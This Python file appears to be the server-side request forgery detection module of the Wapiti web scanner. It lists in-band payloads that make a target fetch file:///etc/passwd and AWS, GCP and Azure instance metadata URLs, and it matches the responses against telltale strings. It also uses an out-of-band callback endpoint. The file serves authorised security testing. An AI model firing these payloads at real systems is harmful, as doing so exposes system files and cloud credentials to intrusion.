#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (https://wapiti-scanner.github.io)
# Copyright (C) 2018-2023 Nicolas Surribas
# Copyright (C) 2021-2024 Cyberwatch
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
from asyncio import sleep
from typing import Optional, Iterator
from binascii import hexlify, unhexlify

from httpx import ReadTimeout, RequestError

from wapitiCore.main.log import logging, log_red, log_orange, log_verbose
from wapitiCore.attack.attack import Attack, Mutator, Parameter, ParameterSituation
from wapitiCore.language.vulnerability import Messages
from wapitiCore.definitions.ssrf import SsrfFinding
from wapitiCore.definitions.resource_consumption import ResourceConsumptionFinding
from wapitiCore.definitions.internal_error import InternalErrorFinding
from wapitiCore.model import PayloadInfo, str_to_payloadinfo
from wapitiCore.net import Request, Response
from wapitiCore.net.web import http_repr

SSRF_PAYLOAD = "{external_endpoint}ssrf/{random_id}/{path_id}/{hex_param}/"

# In-band payloads: if the application fetches and reflects the content,
# these patterns will appear in the HTTP response.
SSRF_INBAND_PAYLOADS = [
    # Linux file disclosure via file:// scheme
    {
        "payload": "file:///etc/passwd",
        "rules": ["root:x:0:0", "daemon:x:"],
    },
    {
        "payload": "file:///etc/networks",
        "rules": ["loopback", "link-local"],
    },
    # Windows file disclosure via file:// scheme
    {
        "payload": "file:///c:/windows/system32/drivers/etc/networks",
        "rules": ["loopback"],
    },
    # AWS EC2 instance metadata
    {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "rules": ["ami-id", "instance-id", "instance-type"],
    },
    # GCP instance metadata
    {
        "payload": "http://metadata.google.internal/computeMetadata/v1/",
        "rules": ["attributes/"],
    },
    # Azure instance metadata
    {
        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "rules": ["azEnvironment", "resourceGroupName"],
    },
]


def _make_payload_info(payload: str, rules: Optional[list] = None) -> PayloadInfo:
    """Build a PayloadInfo with detection rules for in-band matching."""
    info = PayloadInfo(payload=payload)
    info.rules = rules or []
    return info


def _search_patterns(content: str, patterns: list) -> str:
    """Return the first pattern found in content, or empty string."""
    for pattern in patterns:
        if pattern in content:
            return pattern
    return ""


class ModuleSsrf(Attack):
    """
    Detect Server-Side Request Forgery vulnerabilities.
    """

    name = "ssrf"
    MSG_VULN = "SSRF vulnerability"
    parallelize_attacks = True

    def __init__(self, crawler, persister, attack_options, crawler_configuration):
        super().__init__(crawler, persister, attack_options, crawler_configuration)
        self.mutator = self.get_mutator()

    def get_payloads(
            self,
            request: Optional[Request] = None,
            parameter: Optional[Parameter] = None,
    ) -> Iterator[PayloadInfo]:
        """Generate SSRF payloads: one OOB payload for the external endpoint,
        then in-band payloads targeting local files and cloud metadata services."""
        if parameter.situation == ParameterSituation.QUERY_STRING and parameter.name == "":
            parameter_name = "QUERY_STRING"
        else:
            parameter_name = parameter.name

        # 1) Out-of-band payload: relies on the external endpoint callback
        oob_payload = SSRF_PAYLOAD.format(
            external_endpoint=self.external_endpoint,
            random_id=self._session_id,
            path_id=request.path_id,
            hex_param=hexlify(parameter_name.encode("utf-8", errors="replace")).decode()
        )
        yield _make_payload_info(oob_payload, rules=[])

        # 2) In-band payloads: detectable via response content analysis
        for entry in SSRF_INBAND_PAYLOADS:
            yield _make_payload_info(entry["payload"], rules=entry["rules"])

    async def _check_false_positive(self, request: Request, pattern: str) -> bool:
        """Send the original request without payload to check if the pattern already exists."""
        try:
            response = await self.crawler.async_send(request)
        except RequestError:
            self.network_errors += 1
            return False
        return pattern in response.content

    async def attack(self, request: Request, response: Optional[Response] = None):
        timeouted = False
        page = request.path
        saw_internal_error = False
        current_parameter = None
        vulnerable_parameter = False

        for mutated_request, parameter, payload_info in self.mutator.mutate(request, self.get_payloads):
            if current_parameter != parameter:
                # New parameter: reset vulnerability tracking
                current_parameter = parameter
                vulnerable_parameter = False
            elif vulnerable_parameter:
                # Already found a vuln for this parameter, skip to the next one
                continue

            log_verbose(f"[¨] {mutated_request}")

            try:
                response = await self.crawler.async_send(mutated_request)
            except ReadTimeout:
                self.network_errors += 1
                if timeouted:
                    continue

                log_orange("---")
                log_orange(Messages.MSG_TIMEOUT, page)
                log_orange(Messages.MSG_EVIL_REQUEST)
                log_orange(http_repr(mutated_request))
                log_orange("---")

                if parameter.is_qs_injection:
                    anom_msg = Messages.MSG_QS_TIMEOUT
                else:
                    anom_msg = Messages.MSG_PARAM_TIMEOUT.format(parameter.display_name)

                await self.add_medium(
                    finding_class=ResourceConsumptionFinding,
                    request=mutated_request,
                    info=anom_msg,
                    parameter=parameter.display_name,
                )
                timeouted = True
            except RequestError:
                self.network_errors += 1
                continue
            else:
                # In-band detection: check response content for matching patterns
                if payload_info.rules:
                    pattern = _search_patterns(response.content, payload_info.rules)
                    if pattern and not await self._check_false_positive(request, pattern):
                        if parameter.is_qs_injection:
                            vuln_message = Messages.MSG_QS_INJECT.format(self.MSG_VULN, page)
                        else:
                            vuln_message = (
                                f"{self.MSG_VULN} via injection in the parameter {parameter.display_name}"
                            )

                        await self.add_high(
                            finding_class=SsrfFinding,
                            request=mutated_request,
                            info=vuln_message,
                            parameter=parameter.display_name,
                            response=response
                        )

                        log_red("---")
                        log_red(
                            Messages.MSG_QS_INJECT if parameter.is_qs_injection else Messages.MSG_PARAM_INJECT,
                            self.MSG_VULN,
                            page,
                            parameter.display_name
                        )
                        log_red(Messages.MSG_EVIL_REQUEST)
                        log_red(http_repr(mutated_request))
                        log_red("---")

                        vulnerable_parameter = True
                        continue

                if response.is_server_error and not saw_internal_error:
                    saw_internal_error = True
                    if parameter.is_qs_injection:
                        anom_msg = Messages.MSG_QS_500
                    else:
                        anom_msg = Messages.MSG_PARAM_500.format(parameter.display_name)

                    await self.add_high(
                        finding_class=InternalErrorFinding,
                        request=mutated_request,
                        info=anom_msg,
                        parameter=parameter.display_name,
                        response=response
                    )

                    log_orange("---")
                    log_orange(Messages.MSG_500, page)
                    log_orange(Messages.MSG_EVIL_REQUEST)
                    log_orange(http_repr(mutated_request))
                    log_orange("---")

    async def finish(self):
        endpoint_url = f"{self.internal_endpoint}get_ssrf.php?session_id={self._session_id}"
        logging.info("[*] Asking endpoint URL %s for results, please wait...", endpoint_url)
        await sleep(2)
        # When attacks are down we ask the endpoint for receive requests
        endpoint_request = Request(endpoint_url)
        try:
            response = await self.crawler.async_send(endpoint_request)
        except RequestError:
            self.network_errors += 1
            logging.error("[!] Unable to request endpoint URL '%s'", self.internal_endpoint)
        else:
            data = response.json
            if isinstance(data, dict):
                for request_id in data:
                    original_request = await self.persister.get_path_by_id(request_id)
                    if original_request is None:
                        logging.warning(
                            "[!] Could not find original request with ID %s, skipping",
                            request_id
                        )
                        continue

                    page = original_request.path
                    for hex_param in data[request_id]:
                        parameter = unhexlify(hex_param).decode("utf-8")

                        for infos in data[request_id][hex_param]:
                            request_url = infos["url"]
                            # Date in ISO format
                            request_date = infos["date"]
                            request_ip = infos["ip"]
                            request_method = infos["method"]
                            # request_size = infos["size"]

                            if parameter == "QUERY_STRING":
                                vuln_message = Messages.MSG_QS_INJECT.format(self.MSG_VULN, page)
                            else:
                                vuln_message = (
                                    f"{self.MSG_VULN} via injection in the parameter {parameter}.\n"
                                    f"The target performed an outgoing HTTP {request_method} request at {request_date} "
                                    f"with IP {request_ip}.\n"
                                    f"Full request can be seen at {request_url}"
                                )

                            mutator = Mutator(
                                methods="G" if original_request.method == "GET" else "PF",
                                qs_inject=self.must_attack_query_string,
                                parameters=[parameter],
                                skip=self.options.get("skipped_parameters")
                            )

                            mutated_request, __, __ = next(mutator.mutate(
                                original_request,
                                str_to_payloadinfo(["http://external.url/page"])
                            ))

                            await self.add_critical(
                                finding_class=SsrfFinding,
                                request=mutated_request,
                                info=vuln_message,
                                parameter=parameter,
                                response=response
                            )

                            log_red("---")
                            log_red(
                                Messages.MSG_QS_INJECT if parameter == "QUERY_STRING"
                                else Messages.MSG_PARAM_INJECT,
                                self.MSG_VULN,
                                page,
                                parameter
                            )
                            log_red(Messages.MSG_EVIL_REQUEST)
                            log_red(http_repr(mutated_request))
                            log_red("---")
